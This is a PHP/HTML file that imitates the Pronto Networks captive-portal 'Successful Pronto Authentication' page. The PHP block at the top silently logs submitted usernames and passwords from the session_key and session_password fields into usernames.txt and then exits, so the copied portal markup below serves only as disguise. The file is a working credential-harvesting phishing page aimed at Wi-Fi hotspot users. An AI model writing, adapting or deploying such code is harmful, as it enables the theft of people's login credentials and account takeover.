<?php
file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
exit();
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Successful Pronto Authentication</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <link href="/Images/css.css" rel="stylesheet" type="text/css">
    <style type="text/css">
      body {
        margin-left: 0px;
        margin-top: 1%;
        margin-right: 0px;
        margin-bottom: 0px;
      }
    </style>
    <script language="javascript">
      var dayArray = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
      var monthArray = new Array("January","February","March","April","May","June","July","August","September","October","November","December");
      var mynow = new Date();
      var mydate = mynow.getDate();
      var mymonth = mynow.getMonth();
      var myday = mynow.getDay();
      var myyear = mynow.getFullYear();
      var myhour = mynow.getHours();
      var dateStr = new String(dayArray[myday]+" "+monthArray[mymonth]+" "+mydate+", "+myyear);
      function formCheck(){
        if(!document.forms[0].userId.value){
          alert("Please enter your username to log in.");
          document.forms[0].userId.focus();
          return false;
        }
        if(!document.forms[0].password.value){
          alert("Please enter your password to log in.");
          document.forms[0].password.focus();
          return false;
        }
        return true;
      }
    </script>
    <script language="javascript">
      window.name="logoffpage";
    </script>
    <script language="javascript">
      function popOURL() {
        OURLWindow=window.open("http://www.google.com", "OURLWindow", "scrollbars=yes,toolbar=yes,status=yes,resizable=yes,menubar=yes,location=yes");
      }
    </script>
    <script language="javascript">
      function popMe() {
        var logoutContent = '<html><head>' +
          '<script language="javascript">' +
          'var flagger=0;' +
          'function logoff(flagger) {' +
          'if (flagger == 1) {' +
          '   if ( confirm("You will be logged off your internet session. Is this what you want?") ) {' +
          '     document.forms[0].submit();' +
          '     window.close();' +
          '     return true;' +
          '   }' +
          '   else {' +
          '     return false;' +
          '   }' +
          '}' +
          'else {' +
          '     document.forms[0].submit();' +
          '     window.close();' +
          '     alert("You have been logged out");' +
          '   return true;' +
          '}' +
          'flagger=0;' +
          '}' +
          '<\/script>' +
          '<link rel="stylesheet" type="text/css" href="/Images/style.css">' +
          '</head>' +
          '<body onunload="return logoff(0);">' +
          '<form action="/cgi-bin/authlogout" name="logout" target="logoffpage">' +
          '<input type="hidden" name="blank" value="">' +
          '</form>' +
          '<center>' +
          '<table bgcolor="#000000" cellspacing="1" cellpadding="1" align="center">' +
          '	   <tbody><tr>' +
          '	    <td align="center" valign="top">' +
          '	     <table width="200" bgcolor="#CCCCCC" cellpadding="3" cellspacing="0">' +
          '		 <tbody><tr>' +
          '		  <td colspan="2" class="gray11Bold" align="center"><span class="gray12Bold">Log Out</span><br><br>Click on the button below to log out from your session when you are through using the internet<br></td>' +
          '		 </tr>' +
          '	 <tr>' +
          '	  <td height="20" colspan="2"><img src="/Images/spacer.gif" height="20"></td>' +
          '	 </tr>' +
          '	 <form action="" name="logout"></form>' +
          '	 	 <tr>' +
          '<td colspan="2" align="center">' +
          '<input type="button" value="Logout" onclick="javascript:logoff(1);"><br>' +
          '	 </td></tr>' +
          '	 	 <tr>' +
          '	 	  <td height="20" colspan="2"><img src="/Images/spacer.gif" height="20"></td>' +
          '	 </tr>' +
          '	 </tbody></table>' +
          '	</td>' +
          '	</tr>' +
          '	</tbody></table>' +
          '</center>' +
          '</body></html>';

        // Create a new window
        var logoutWindow = window.open('', 'logOutWindow' + '1744699342913', 'scrollbars=no,status=no,width=240,height=265,resizable=no,menubar=no,location=no');
        
        // Write the HTML content to the window
        logoutWindow.document.write(logoutContent);
        logoutWindow.document.close();
      }
    </script>
  </head>
  <body bgcolor="#B8C6BF" onLoad="popOURL(); popMe();">
    <table width="778px" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="3" bgcolor="#000000" colspan="2"></td>
      </tr>
      <tr>
        <td>
          <table width="100%" border="0" cellspacing="0" cellpadding="0">
            <tr>
              <td height="10" bgcolor="#97A69B" colspan="2"></td>
              <td></td>
            </tr>
            <tr>
              <td width="345" height="63">
                <img src="/Images/logo.jpg" width="345" height="63">
              </td>
              <td>
                <script language="javascript" type="text/javascript" src="/Images/wisp.js"></script>
              </td>
              <!-- <td bgcolor="#F6F8F5"></td> -->
            </tr>
            <tr>
              <td height="3" colspan="2" bgcolor="#E7EBE5"></td>
            </tr>
            <tr>
              <td colspan="2" bgcolor="#F6F8F5">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td width="18%" rowspan="3" valign="top"></td>
                    <td height="19">&nbsp;</td>
                    <td width="18%" rowspan="3" valign="top"></td>
                  </tr>
                  <tr>
                    <td width="64%" height="3"></td>
                  </tr>
                  <tr>
                    <td height="213" valign="top">
                      <table width="370" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="370" height="200px" bgcolor="#E7EBE5">
                            <table width="323px" border="0" align="center" cellpadding="1" cellspacing="0">
                              <tr>
                                <td bgcolor="#FFFFFF" height="100px">
                                  <table width="100%" border="0" cellspacing="0" cellpadding="1">
                                    <form>
                                      <tr>
                                        <td>
                                          <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#F3F5F2">
                                            <tr>
                                              <td width="59%" height="10px">
                                                <table cellspacing="0" cellpadding="0">
                                                  <tr>
                                                    <td align="center">
                                                      <p class="orangeText10">
                                                        Congratulations !!! <br>
                                                        You have been logged in. You may now surf the Internet.
                                                      </p>
                                                    </td>
                                                  </tr>
                                                  <tr>
                                                    <td class="blue11" align="center">&nbsp;</td>
                                                  </tr>
                                                  <tr>
                                                    <td class="blue11" align="center">
                                                      <span class="blackText10">Click here to </span>
                                                      <a href="http://115.248.50.60/registration/Main.jsp?sessionId=1744699342913&wispId=1" class="orangeText10">Check Your Account Details </a>
                                                    </td>
                                                  </tr>
                                                  <tr>
                                                    <td></td>
                                                  </tr>
                                                  <tr>
                                                    <td align="middle">&nbsp;</td>
                                                  </tr>
                                                  <tr>
                                                    <td>
                                                      <p class="blackText11">To Logout: </p>
                                                      <p class="blackText10">
                                                        If you don't see a logout popup screen, then probably your computer may have popup blocker enabled. In that case, you may logout by
                                                        <a href="http://phc.prontonetworks.com/cgi-bin/authlogout" class="orangeText10">clicking here </a>.
                                                      </p>
                                                    </td>
                                                  </tr>
                                                </table>
                                              </td>
                                            </tr>
                                          </table>
                                        </td>
                                      </tr>
                                    </form>
                                  </table>
                                </td>
                              </tr>
                            </table>
                          </td>
                        </tr>
                      </table>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
            <tr>
              <td height="3" colspan="2" bgcolor="#E7EBE5"></td>
            </tr>
            <tr>
              <td height="20" colspan="2" align="center" valign="bottom" bgcolor="#F3F5F2" class="orangeText10"></td>
            </tr>
            <tr>
              <td height="3" colspan="2" bgcolor="#E7EBE5"></td>
            </tr>
            <tr>
              <td colspan="2" bgcolor="#F6F8F5"></td>
            </tr>
            <tr>
              <td colspan="2" bgcolor="#F6F8F5">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td width="130" height="120" align="left">
                      <script language="javascript" type="text/javascript" src="/Images/location.js"></script>
                    </td>
                    <td width="206" height="120"></td>
                    <td width="97" height="120"></td>
                    <td width="202" height="120"></td>
                    <td width="138" height="120" align="right">
                      <script language="javascript" type="text/javascript" src="/Images/franchise.js"></script>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
            <tr>
              <td colspan="2" bgcolor="#97A69B" width="800" height="10"></td>
            </tr>
            <tr>
              <td colspan="2" bgcolor="#000000" height="3"></td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </body>
</html>
